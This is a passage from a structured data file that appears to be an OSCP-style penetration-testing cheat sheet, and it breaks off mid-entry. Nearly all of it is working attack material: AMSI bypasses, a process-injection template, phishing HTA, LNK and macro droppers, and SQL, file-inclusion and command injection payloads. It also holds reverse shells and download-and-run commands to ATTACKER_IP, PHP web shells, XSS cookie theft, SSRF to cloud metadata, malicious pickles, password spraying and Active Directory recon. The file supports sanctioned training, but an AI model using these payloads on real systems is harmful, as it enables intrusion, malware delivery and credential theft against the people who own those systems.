                    "$b = $a.GetField('amsiInitFailed','NonPublic,Static')",
                    "$b.SetValue($null,$true)",
                    "",
                    "# Matt Graeber's one-liner (obfuscated version)",
                    "[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType(('System.Management.Automation.Am'+'siUtils')).GetField(('am'+'siCon'+'text'),[Reflection.BindingFlags]('NonPublic,Static')).GetValue($null),0x04)",
                    "",
                    "# PowerShell constrained language mode bypass",
                    "$ExecutionContext.SessionState.LanguageMode",
                    "# If \"ConstrainedLanguage\", try running from cmd:",
                    "powershell -version 2 -c \"IEX(...)\"  # Downgrades to v2 (no AMSI)"
                  ]
                }
              ]
            },
            {
              "desc": "Basic Thread Injection (C#)",
              "entries": [
                {
                  "subdesc": "Classic process injection template. Compile with csc.exe /unsafe Injector.cs or Visual Studio. Target a long-running process like explorer.exe or svchost.exe. Replace shellcode bytes with msfvenom output (-f csharp).",
                  "cmd": [
                    "using System;",
                    "using System.Runtime.InteropServices;",
                    "",
                    "class Injector {",
                    "    [DllImport(\"kernel32.dll\")] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);",
                    "    [DllImport(\"kernel32.dll\")] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr, uint size, uint type, uint protect);",
                    "    [DllImport(\"kernel32.dll\")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr addr, byte[] buffer, uint size, out UIntPtr written);",
                    "    [DllImport(\"kernel32.dll\")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr attr, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, IntPtr threadId);",
                    "    ",
                    "    static void Main(string[] args) {",
                    "        // msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp",
                    "        byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, 0xe4 /* ... */ };",
                    "        ",
                    "        int pid = int.Parse(args[0]); // Target process PID",
                    "        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);",
                    "        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);",
                    "        WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out _);",
                    "        CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);",
                    "    }",
                    "}"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-21",
          "name": "Payload Delivery Techniques",
          "description": "Payload Delivery Techniques",
          "commands": [
            {
              "desc": "HTA (HTML Application)",
              "entries": [
                {
                  "subdesc": "Great for initial access via phishing. HTA files execute outside the browser sandbox with full system privileges. Deliver via email or serve from an HTTP server and trick the target into opening it.",
                  "cmd": [
                    "<html>",
                    "<head><script language=\"VBScript\">",
                    "Sub Execute()",
                    "    Dim obj",
                    "    Set obj = CreateObject(\"Wscript.Shell\")",
                    "    obj.Run \"powershell -nop -w hidden -e <BASE64-PAYLOAD>\", 0",
                    "End Sub",
                    "Execute",
                    "</script></head>",
                    "</html>"
                  ]
                },
                {
                  "cmd": [
                    "# Generate HTA with msfvenom",
                    "msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psl -o evil.hta"
                  ]
                }
              ]
            },
            {
              "desc": "DLL Side-Loading",
              "entries": [
                {
                  "subdesc": "Abuse legitimate applications that load DLLs from their working directory. Place a malicious DLL alongside a trusted executable — the app loads your DLL automatically. Research the app's import table to find the right DLL name.",
                  "cmd": [
                    "# Find a legitimate application that loads a specific DLL",
                    "# Create malicious DLL with the same name",
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o target_dll.dll",
                    "",
                    "# Place alongside the legitimate executable",
                    "# When the application runs, it loads your DLL"
                  ]
                }
              ]
            },
            {
              "desc": "LNK File (Shortcut Weaponization)",
              "entries": [
                {
                  "subdesc": "Social engineering delivery. Create a shortcut that looks like a document or folder but executes a payload. Change the icon to match the disguise.",
                  "cmd": [
                    "# Create a malicious shortcut",
                    "$shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut('C:\\Temp\\resume.lnk')",
                    "$shortcut.TargetPath = 'powershell.exe'",
                    "$shortcut.Arguments = '-nop -w hidden -e <BASE64-PAYLOAD>'",
                    "$shortcut.IconLocation = 'C:\\Windows\\System32\\shell32.dll,1'  # Folder icon",
                    "$shortcut.Save()"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-22",
          "name": "Nmap IDS/IPS Evasion",
          "description": "Use when network scanning triggers IDS/IPS alerts or blocks. These techniques fragment, spoof, and slow scans to avoid detection.",
          "commands": [
            {
              "desc": "Nmap IDS/IPS Evasion",
              "entries": [
                {
                  "subdesc": "Use when network scanning triggers IDS/IPS alerts or blocks. These techniques fragment, spoof, and slow scans to avoid detection.",
                  "cmd": [
                    "# Fragment packets",
                    "nmap -f <TARGET>",
                    "nmap --mtu 16 <TARGET>",
                    "",
                    "# Decoy scans (blend with fake source IPs)",
                    "nmap -D RND:10 <TARGET>",
                    "nmap -D decoy1,decoy2,ME <TARGET>",
                    "",
                    "# Source port manipulation (DNS/HTTP ports often allowed)",
                    "nmap --source-port 53 <TARGET>",
                    "nmap --source-port 80 <TARGET>",
                    "",
                    "# Timing control (slower = stealthier)",
                    "nmap -T0 <TARGET>  # Paranoid",
                    "nmap -T1 <TARGET>  # Sneaky",
                    "nmap -T2 <TARGET>  # Polite",
                    "",
                    "# Data length manipulation",
                    "nmap --data-length 25 <TARGET>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-23",
          "name": "Testing Against AV",
          "description": "Always test payloads before deployment. Use a local VM with the target's AV. Never upload to VirusTotal — it shares with all AV vendors. Use AntiScan.me for safe testing.",
          "commands": [
            {
              "desc": "Testing Against AV",
              "entries": [
                {
                  "subdesc": "Always test payloads before deployment. Use a local VM with the target's AV. Never upload to VirusTotal — it shares with all AV vendors. Use AntiScan.me for safe testing.",
                  "cmd": [
                    "# Check against Windows Defender (on a test VM)",
                    "# Upload file and check:",
                    "Get-MpThreatDetection",
                    "",
                    "# Scan a specific file",
                    "MpCmdRun.exe -Scan -ScanType 3 -File \"C:\\Temp\\payload.exe\"",
                    "",
                    "# Check VirusTotal (OPSEC warning: files are shared with AV vendors!)",
                    "# For engagements: use AntiScan.me instead (does not distribute samples)"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-24",
          "name": "SQL Injection",
          "description": "Test every user input that reaches a database query — URL parameters, POST fields, cookies, headers. Start with a single quote (') and look for SQL errors or behavioral changes. Determine injection type, then extract data or escalate to OS command execution.",
          "commands": [
            {
              "desc": "Manual SQLi Detection",
              "entries": [
                {
                  "subdesc": "Test inputs with these payloads. A SQL error or different response confirms injection.",
                  "cmd": [
                    "# String-based probes",
                    "'                       # Single quote (most common trigger)",
                    "' OR '1'='1             # Always-true (auth bypass test)",
                    "' OR '1'='2             # Always-false (compare against true)",
                    "' AND 1=1--             # True condition with comment",
                    "' AND 1=2--             # False condition with comment",
                    "",
                    "# Numeric probes",
                    "1 OR 1=1",
                    "1 AND 1=2",
                    "",
                    "# Time-based blind detection",
                    "' OR SLEEP(5)--                    # MySQL",
                    "'; WAITFOR DELAY '0:0:5'--         # MSSQL",
                    "' OR pg_sleep(5)--                 # PostgreSQL"
                  ]
                }
              ]
            },
            {
              "desc": "UNION-Based Extraction",
              "entries": [
                {
                  "subdesc": "Find column count, identify displayable columns, then extract schema/tables/data.",
                  "cmd": [
                    "# Step 1: Find column count (increment until error)",
                    "' ORDER BY 1--",
                    "' ORDER BY 2--",
                    "' ORDER BY 3--",
                    "",
                    "# Step 2: Find displayable columns",
                    "' UNION SELECT 'aaa',NULL,NULL--",
                    "' UNION SELECT NULL,'bbb',NULL--",
                    "",
                    "# Step 3: Extract DB version",
                    "' UNION SELECT NULL,version(),NULL--          # MySQL/PostgreSQL",
                    "' UNION SELECT NULL,@@version,NULL--          # MSSQL",
                    "",
                    "# Step 4: Enumerate databases",
                    "' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--",
                    "",
                    "# Step 5: Enumerate tables",
                    "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--",
                    "",
                    "# Step 6: Enumerate columns",
                    "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                    "",
                    "# Step 7: Extract data",
                    "' UNION SELECT NULL,concat(username,':',password),NULL FROM users--"
                  ]
                }
              ]
            },
            {
              "desc": "sqlmap Automation",
              "entries": [
                {
                  "subdesc": "Use after confirming injection manually. Save Burp request to a file for reliable targeting.",
                  "cmd": [
                    "# Scan URL parameter",
                    "sqlmap -u 'http://TARGET/page?id=1' --batch",
                    "",
                    "# From saved Burp request",
                    "sqlmap -r request.txt --batch",
                    "",
                    "# Enumerate and dump",
                    "sqlmap -r request.txt --dbs --batch",
                    "sqlmap -r request.txt -D target_db --tables --batch",
                    "sqlmap -r request.txt -D target_db -T users --dump --batch",
                    "",
                    "# OS shell (if privileges allow)",
                    "sqlmap -r request.txt --os-shell --batch",
                    "",
                    "# Max depth + WAF bypass",
                    "sqlmap -r request.txt --level=5 --risk=3 --tamper=space2comment --batch"
                  ]
                }
              ]
            },
            {
              "desc": "DB-Specific Command Execution",
              "entries": [
                {
                  "subdesc": "If the DB user has sufficient privileges, escalate SQLi to OS command execution.",
                  "cmd": [
                    "# MySQL — read files",
                    "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--",
                    "",
                    "# MySQL — write web shell (requires FILE priv + writable dir)",
                    "' UNION SELECT NULL,'<?php system($_GET[\"cmd\"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--",
                    "",
                    "# MSSQL — enable and use xp_cmdshell",
                    "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--",
                    "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--",
                    "'; EXEC xp_cmdshell 'whoami';--",
                    "",
                    "# PostgreSQL — command execution",
                    "'; COPY (SELECT '') TO PROGRAM 'id';--"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-25",
          "name": "Local File Inclusion / Remote File Inclusion",
          "description": "Test any parameter that references a file (page=, file=, template=, lang=, include=). Start with basic path traversal to read /etc/passwd, then escalate: read config files/SSH keys, try PHP wrappers for source disclosure or RCE, try log poisoning for shell access.",
          "commands": [
            {
              "desc": "Path Traversal & LFI",
              "entries": [
                {
                  "subdesc": "Escape the intended directory to read sensitive server files.",
                  "cmd": [
                    "# Basic traversal (Linux)",
                    "?page=../../../../etc/passwd",
                    "?page=....//....//....//etc/passwd",
                    "",
                    "# Basic traversal (Windows)",
                    "?page=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "",
                    "# Null byte bypass (PHP < 5.3.4)",
                    "?page=../../../../etc/passwd%00",
                    "?page=../../../../etc/passwd%00.php",
                    "",
                    "# Double URL encoding",
                    "?page=%252e%252e%252f%252e%252e%252fetc/passwd",
                    "",
                    "# Stripped dot-dot bypass",
                    "?page=....//....//....//etc/passwd"
                  ]
                }
              ]
            },
            {
              "desc": "PHP Wrappers (LFI to RCE)",
              "entries": [
                {
                  "subdesc": "PHP stream wrappers can read source code (php://filter) or execute code directly (data://, php://input).",
                  "cmd": [
                    "# Read PHP source (base64-encoded to avoid execution)",
                    "?page=php://filter/convert.base64-encode/resource=index.php",
                    "?page=php://filter/convert.base64-encode/resource=config.php",
                    "echo 'BASE64_OUTPUT' | base64 -d",
                    "",
                    "# Direct code execution via data:// (requires allow_url_include=On)",
                    "?page=data://text/plain,<?php system('id'); ?>",
                    "?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
                    "",
                    "# Code execution via php://input (POST body = code)",
                    "curl -X POST 'http://TARGET/page.php?page=php://input' -d '<?php system(\"id\"); ?>'"
                  ]
                }
              ]
            },
            {
              "desc": "Log Poisoning (LFI to RCE)",
              "entries": [
                {
                  "subdesc": "Inject PHP into a log file, then include the log via LFI to execute it.",
                  "cmd": [
                    "# Step 1: Confirm you can read the log",
                    "?page=../../../../var/log/apache2/access.log",
                    "",
                    "# Step 2: Inject PHP into the log via User-Agent",
                    "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://TARGET/",
                    "",
                    "# Step 3: Include the poisoned log with a command",
                    "?page=../../../../var/log/apache2/access.log&cmd=id",
                    "",
                    "# SSH log poisoning (inject via SSH username)",
                    "ssh '<?php system($_GET[\"cmd\"]); ?>'@TARGET",
                    "# Then include: ?page=../../../../var/log/auth.log&cmd=id"
                  ]
                }
              ]
            },
            {
              "desc": "Remote File Inclusion",
              "entries": [
                {
                  "subdesc": "Include a file from your attack machine. Requires allow_url_include=On.",
                  "cmd": [
                    "# Host a PHP payload",
                    "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
                    "python3 -m http.server 80",
                    "",
                    "# Include remote file",
                    "?page=http://ATTACKER_IP/shell.php",
                    "?page=http://ATTACKER_IP/shell.php&cmd=id",
                    "",
                    "# Bypass extension appending",
                    "?page=http://ATTACKER_IP/shell.php%00",
                    "?page=http://ATTACKER_IP/shell.php?"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-26",
          "name": "Command Injection",
          "description": "Test any input that might trigger a server-side command (ping, lookup, file operations). Try each metacharacter: ;  |  &&  &  newline  `cmd`  $(cmd). If output is not returned (blind injection), use time delays or out-of-band callbacks to confirm.",
          "commands": [
            {
              "desc": "Detection Payloads",
              "entries": [
                {
                  "subdesc": "Try each metacharacter — different ones work depending on OS and how the command is built.",
                  "cmd": [
                    "# Semicolon — command separator (Linux)",
                    "; id",
                    "; whoami",
                    "",
                    "# Pipe — pipe to next command",
                    "| id",
                    "| whoami",
                    "",
                    "# AND operators",
                    "&& id",
                    "& id",
                    "",
                    "# Newline (URL-encoded)",
                    "%0a id",
                    "%0a whoami",
                    "",
                    "# Substitution (bash)",
                    "$(id)",
                    "`whoami`"
                  ]
                }
              ]
            },
            {
              "desc": "Blind Command Injection",
              "entries": [
                {
                  "subdesc": "Confirm injection via time delays or out-of-band callbacks when output is not displayed.",
                  "cmd": [
                    "# Time-based confirmation",
                    "; sleep 5",
                    "| ping -c 5 127.0.0.1",
                    "& ping -n 5 127.0.0.1          # Windows",
                    "",
                    "# Out-of-band: HTTP callback",
                    "; curl http://ATTACKER_IP/proof",
                    "| curl http://ATTACKER_IP:8000/$(whoami)",
                    "",
                    "# Out-of-band: DNS callback",
                    "; nslookup ATTACKER_DOMAIN",
                    "$(nslookup ATTACKER_DOMAIN)"
                  ]
                }
              ]
            },
            {
              "desc": "Filter Bypass Techniques",
              "entries": [
                {
                  "subdesc": "Bypass space filters, keyword filters, and character restrictions.",
                  "cmd": [
                    "# Space bypass",
                    ";cat${IFS}/etc/passwd          # $IFS = space/tab/newline",
                    ";cat</etc/passwd               # Input redirection",
                    ";{cat,/etc/passwd}             # Brace expansion",
                    "",
                    "# Keyword bypass (if 'cat' is blocked)",
                    ";tac /etc/passwd               # Reverse cat",
                    ";c'a't /etc/passwd             # Quote insertion",
                    ";c\\at /etc/passwd              # Backslash insertion",
                    ";/bin/c?t /etc/passwd           # Wildcard",
                    "",
                    "# Semicolon bypass",
                    "%0a id                         # Newline URL-encoded",
                    "%0d%0a id                      # CRLF"
                  ]
                }
              ]
            },
            {
              "desc": "Escalation to Reverse Shell",
              "entries": [
                {
                  "subdesc": "Once command execution is confirmed, escalate to an interactive reverse shell.",
                  "cmd": [
                    "# Bash reverse shell",
                    "; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'",
                    "",
                    "# Python reverse shell",
                    "; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
                    "",
                    "# Download and execute",
                    "; curl http://ATTACKER_IP/shell.sh | bash",
                    "; wget http://ATTACKER_IP/shell.sh -O /tmp/s.sh && bash /tmp/s.sh"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-27",
          "name": "File Upload Vulnerabilities",
          "description": "Test file upload functions for insufficient validation. The goal is to upload a web shell (PHP/ASPX/JSP) to an executable directory. Try native extension first, then bypass: extension tricks, Content-Type spoofing, magic byte prepending, .htaccess upload.",
          "commands": [
            {
              "desc": "Web Shell Payloads",
              "entries": [
                {
                  "subdesc": "Start with these — upload the shell, then trigger it via the upload directory URL.",
                  "cmd": [
                    "# PHP one-liner web shell (save as shell.php)",
                    "<?php system($_GET['cmd']); ?>",
                    "",
                    "# More robust PHP shell",
                    "<?php echo '<pre>'.shell_exec($_REQUEST['cmd']).'</pre>'; ?>",
                    "",
                    "# After uploading, trigger:",
                    "curl 'http://TARGET/uploads/shell.php?cmd=id'",
                    "curl 'http://TARGET/uploads/shell.php?cmd=whoami'"
                  ]
                }
              ]
            },
            {
              "desc": "Extension Bypass Techniques",
              "entries": [
                {
                  "subdesc": "If .php is blocked, try alternate extensions or double extensions.",
                  "cmd": [
                    "# Alternative PHP extensions",
                    "shell.php3  shell.php5  shell.phtml  shell.phar",
                    "",
                    "# Double extension",
                    "shell.php.jpg",
                    "shell.jpg.php",
                    "",
                    "# Case variation",
                    "shell.pHp  shell.Php  shell.PHP",
                    "",
                    "# Null byte (older systems)",
                    "shell.php%00.jpg",
                    "",
                    "# .htaccess upload (make .jpg execute as PHP on Apache)",
                    "# Upload .htaccess with content:",
                    "AddType application/x-httpd-php .jpg",
                    "# Then upload shell.jpg"
                  ]
                }
              ]
            },
            {
              "desc": "Content-Type & Magic Bytes Bypass",
              "entries": [
                {
                  "subdesc": "Spoof MIME type header and/or prepend valid image header to the shell.",
                  "cmd": [
                    "# Content-Type bypass (change in Burp Repeater)",
                    "# Change: Content-Type: application/x-php",
                    "# To:     Content-Type: image/jpeg",
                    "",
                    "# Magic bytes bypass — prepend GIF header",
                    "# File contents:",
                    "GIF89a",
                    "<?php system($_GET['cmd']); ?>",
                    "",
                    "# Embed PHP in image EXIF data",
                    "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg",
                    "mv image.jpg shell.php.jpg"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-28",
          "name": "Cross-Site Scripting (XSS)",
          "description": "XSS allows injecting JavaScript into pages viewed by other users. In OSCP context, XSS can steal admin cookies/sessions, trigger CSRF actions, or redirect victims. Test every input that's reflected in the page (reflected XSS) or stored in the application (stored XSS).",
          "commands": [
            {
              "desc": "XSS Detection & Payloads",
              "entries": [
                {
                  "subdesc": "Test with basic payloads first, then escalate to cookie theft or session hijacking.",
                  "cmd": [
                    "# Basic detection payloads",
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "\"><script>alert(1)</script>",
                    "'-alert(1)-'",
                    "",
                    "# Cookie stealing (reflected or stored)",
                    "<script>new Image().src='http://ATTACKER_IP/?c='+document.cookie</script>",
                    "<img src=x onerror=\"fetch('http://ATTACKER_IP/?c='+document.cookie)\">",
                    "",
                    "# Filter bypass variations",
                    "<ScRiPt>alert(1)</ScRiPt>         # Case variation",
                    "<img src=x onerror=alert`1`>       # Template literal",
                    "<svg/onload=alert(1)>              # No space needed",
                    "javascript:alert(1)                # In href/src attributes",
                    "",
                    "# Start a listener to capture cookies",
                    "python3 -m http.server 80",
                    "# Or use nc -lvnp 80"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-29",
          "name": "Server-Side Request Forgery (SSRF)",
          "description": "SSRF forces the server to make requests on your behalf — access internal services, read cloud metadata, scan internal network, or interact with services bound to localhost. Look for any parameter that takes a URL or IP address (url=, redirect=, fetch=, proxy=, img=).",
          "commands": [
            {
              "desc": "SSRF Detection & Exploitation",
              "entries": [
                {
                  "subdesc": "Test URL/IP parameters by pointing them at internal addresses and your attack machine.",
                  "cmd": [
                    "# Test for external callback (confirm SSRF exists)",
                    "?url=http://ATTACKER_IP/ssrf-test",
                    "# Listen: python3 -m http.server 80",
                    "",
                    "# Access internal services",
                    "?url=http://127.0.0.1:80",
                    "?url=http://127.0.0.1:8080",
                    "?url=http://127.0.0.1:3306",
                    "?url=http://localhost/admin",
                    "",
                    "# Read local files (if file:// supported)",
                    "?url=file:///etc/passwd",
                    "?url=file:///etc/hosts",
                    "",
                    "# Cloud metadata endpoints",
                    "?url=http://169.254.169.254/latest/meta-data/   # AWS",
                    "?url=http://169.254.169.254/metadata/instance   # Azure",
                    "",
                    "# Internal network scanning (change port/IP)",
                    "?url=http://10.10.10.1:22",
                    "?url=http://192.168.1.1:80",
                    "",
                    "# Bypass filters",
                    "?url=http://0x7f000001/           # Hex IP for 127.0.0.1",
                    "?url=http://2130706433/            # Decimal IP for 127.0.0.1",
                    "?url=http://[::1]/                 # IPv6 localhost"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-30",
          "name": "Insecure Deserialization",
          "description": "Insecure deserialization occurs when an application deserializes untrusted data — allowing object injection that can lead to remote code execution. Common in Java (serialized objects), PHP (unserialize), Python (pickle), and .NET (BinaryFormatter). Look for base64-encoded blobs in cookies, hidden fields, or API requests.",
          "commands": [
            {
              "desc": "Detection & Exploitation",
              "entries": [
                {
                  "subdesc": "Identify serialized data and use framework-specific tools to generate malicious payloads.",
                  "cmd": [
                    "# Identify serialized data",
                    "# Java: base64 blob starting with rO0AB (base64 of 0xACED magic bytes)",
                    "# PHP: strings like O:4:\"User\":2:{...} or a:2:{...}",
                    "# .NET: AAEAAAD (base64 of 00 01 00 00 00 magic bytes)",
                    "",
                    "# ── Java deserialization (ysoserial) ──",
                    "java -jar ysoserial.jar CommonsCollections1 'whoami' | base64",
                    "java -jar ysoserial.jar CommonsCollections4 'bash -c {echo,BASE64_REVSHELL}|{base64,-d}|bash'",
                    "",
                    "# ── PHP deserialization (phpggc) ──",
                    "# phpggc generates gadget chains for PHP frameworks (like ysoserial for Java)",
                    "# List available gadget chains",
                    "phpggc -l",
                    "phpggc -l Laravel        # Filter by framework",
                    "",
                    "# Generate payload (common frameworks)",
                    "phpggc Laravel/RCE1 system 'id'",
                    "phpggc Symfony/RCE4 exec 'whoami'",
                    "phpggc Monolog/RCE1 exec 'id'",
                    "phpggc WordPress/RCE1 exec 'whoami'",
                    "",
                    "# Base64 output (for cookies/parameters)",
                    "phpggc Laravel/RCE1 system 'id' -b",
                    "",
                    "# URL-encoded output",
                    "phpggc Laravel/RCE1 system 'id' -u",
                    "",
                    "# With PHAR archive wrapper (for file:// or phar:// deserialization)",
                    "phpggc Laravel/RCE1 system 'id' -p phar -o exploit.phar",
                    "",
                    "# Manual PHP approach: craft object that triggers __wakeup() or __destruct()",
                    "# Look for: unserialize() calls on user-controlled input",
                    "",
                    "# ── Python pickle ──",
                    "# If you find base64 pickled data, craft malicious pickle:",
                    "import pickle, os, base64",
                    "class RCE:",
                    "    def __reduce__(self):",
                    "        return (os.system, ('id',))",
                    "print(base64.b64encode(pickle.dumps(RCE())))"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-31",
          "name": "Password Spraying & Brute Force",
          "description": "Try common passwords against discovered usernames across all services. Spray one password at a time across many accounts (avoids lockout) rather than many passwords against one account. Start with passwords from cred dumps, company name variations, and seasonal passwords.",
          "commands": [
            {
              "desc": "Credential Spraying Tools",
              "entries": [
                {
                  "subdesc": "Test discovered usernames against common passwords and service-specific defaults.",
                  "cmd": [
                    "# Hydra — HTTP form brute force",
                    "hydra -L users.txt -P passwords.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'",
                    "",
                    "# Hydra — SSH brute force",
                    "hydra -L users.txt -P passwords.txt ssh://TARGET",
                    "",
                    "# Hydra — FTP brute force",
                    "hydra -L users.txt -P passwords.txt ftp://TARGET",
                    "",
                    "# Hydra — SMB brute force",
                    "hydra -L users.txt -P passwords.txt smb://TARGET",
                    "",
                    "# CrackMapExec — SMB spray (one password at a time)",
                    "crackmapexec smb TARGET -u users.txt -p 'Password123!'",
                    "crackmapexec smb TARGET -u users.txt -p 'CompanyName2024!'",
                    "",
                    "# Kerbrute — Kerberos spray (AD)",
                    "kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password123!'",
                    "",
                    "# Common OSCP passwords to try",
                    "# admin, password, Password1, Password123, CompanyName1, Season+Year"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "exploit-32",
          "name": "Client-Side Attacks",
          "description": "When direct exploitation fails, target users via malicious files. Create Office macros, HTA files, or library files and deliver them via email, web, or file shares. These attacks require social engineering context — they work in OSCP when a simulated user opens your file.",
          "commands": [
            {
              "desc": "Malicious Document & File Attacks",
              "entries": [
                {
                  "subdesc": "Generate payloads that execute when a user opens a file or clicks a link.",
                  "cmd": [
                    "# ── Office Macro (VBA) ──",
                    "# In Word/Excel: Developer > Visual Basic > ThisDocument",
                    "# Macro that runs on document open:",
                    "Sub AutoOpen()",
                    "    Shell \"cmd /c powershell -e ENCODED_PAYLOAD\"",
                    "End Sub",
                    "",
                    "# ── HTA (HTML Application) ──",
                    "# Save as evil.hta and serve via HTTP",
                    "<html><body>",
                    "<script language=\"VBScript\">",
                    "Set s = CreateObject(\"WScript.Shell\")",
                    "s.Run \"powershell -e ENCODED_PAYLOAD\"",
                    "</script></body></html>",
                    "",
                    "# ── Windows Library File (.library-ms) ──",
                    "# Point to a WebDAV share you control; when user browses, NTLM auth captured",
                    "",
                    "# ── msfvenom macro payload ──",
                    "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f vba",
                    "",
                    "# Host malicious files",
                    "python3 -m http.server 80",
                    "# Or use WebDAV: wsgidav --host=0.0.0.0 --port=80 --root=/tmp/share --auth=anonymous"
                  ]
                }
              ]
            }
          ]
        }
    ]
  },

  /* ─── Phase 4: Active Directory ───────────────────────── */
  {
    "id": "active_directory_exploitation",
    "name": "Active Directory Exploitation",
    "optional": true,
    "items": [
        {
          "id": "ad-1",
          "name": "Initial Domain Reconnaissance",
          "description": "When to run: Immediately after gaining a shell on a domain-joined machine. These commands require no special tools — they use built-in Windows utilities.",
          "commands": [
            {
              "desc": "From a Domain-Joined Windows Host",
              "entries": [
                {
                  "cmd": [
                    ":: Domain information — determine what domain you're in and who the DC is",
                    "systeminfo | findstr /B /C:\"Domain\"",
                    "set userdomain",
                    "set logonserver",
                    "",
                    ":: Domain controllers — identify all DCs (critical targets)",
                    "nltest /dsgetdc:<DOMAIN>",
                    "nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>",
                    "",
                    ":: Current domain (PowerShell)",
                    "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()",
                    "",
                    ":: Forest information (PowerShell) — reveals trust relationships",
                    "[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()"
                  ]
                }
              ]
            },
            {
              "desc": "Net Commands",
              "entries": [
                {
                  "subdesc": "Purpose: Quick domain enumeration using built-in net commands. Works without importing any tools. Useful when PowerShell is unavailable or restricted.",
                  "cmd": [
                    ":: Domain users — enumerate all users in the domain",
                    "net user /domain",
                    "net user <USERNAME> /domain",
                    "",
                    ":: Domain groups — identify high-value groups",
                    "net group /domain",
                    "net group \"Domain Admins\" /domain",
                    "net group \"Enterprise Admins\" /domain",
                    "net group \"Domain Controllers\" /domain",
                    "",
                    ":: Domain computers",
                    "net group \"Domain Computers\" /domain",
                    "",
                    ":: Password policy — check lockout threshold BEFORE password spraying",
                    "net accounts /domain"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-2",
          "name": "BloodHound (Automated AD Attack Path Mapping)",
          "description": "Purpose: BloodHound visualizes AD relationships and identifies the shortest attack paths to Domain Admin. Run this as early as possible after gaining domain credentials. Install: sudo apt install bloodhound neo4j (Kali). For SharpHound, download from the BloodHound GitHub releases.",
          "commands": [
            {
              "desc": "Collection with SharpHound",
              "entries": [
                {
                  "cmd": [
                    "# Download and run SharpHound collector",
                    "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER-IP>/SharpHound.ps1')",
                    "Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Temp -ZipFileName bloodhound.zip",
                    "",
                    "# Or use the exe",
                    ".\\SharpHound.exe --CollectionMethods All --ZipFileName bloodhound.zip"
                  ]
                }
              ]
            },
            {
              "desc": "Collection from Linux",
              "entries": [
                {
                  "cmd": [
                    "# bloodhound-python — remote AD data collection without needing a Windows host",
                    "# Install: pip3 install bloodhound",
                    "bloodhound-python -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -ns <DC-IP> -c all"
                  ]
                }
              ]
            },
            {
              "desc": "Analysis",
              "entries": [
                {
                  "cmd": [
                    "# Start BloodHound",
                    "sudo neo4j start",
                    "bloodhound",
                    "",
                    "# Key queries to run immediately:",
                    "# - \"Find Shortest Path to Domain Admin\"",
                    "# - \"Find All Kerberoastable Users\"",
                    "# - \"Find AS-REP Roastable Users\"",
                    "# - \"Find Users with DCSync\"",
                    "# - \"Shortest Path from Owned Principals\""
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-3",
          "name": "CrackMapExec / NetExec (Swiss Army Knife)",
          "description": "Purpose: All-in-one AD enumeration and exploitation. Use nxc (NetExec) as the modern replacement for crackmapexec. Always use --continue-on-success when spraying credentials to avoid stopping at the first valid hit. Install: sudo apt install crackmapexec or pip3 install netexec",
          "commands": [
            {
              "desc": "CrackMapExec / NetExec (Swiss Army Knife)",
              "entries": [
                {
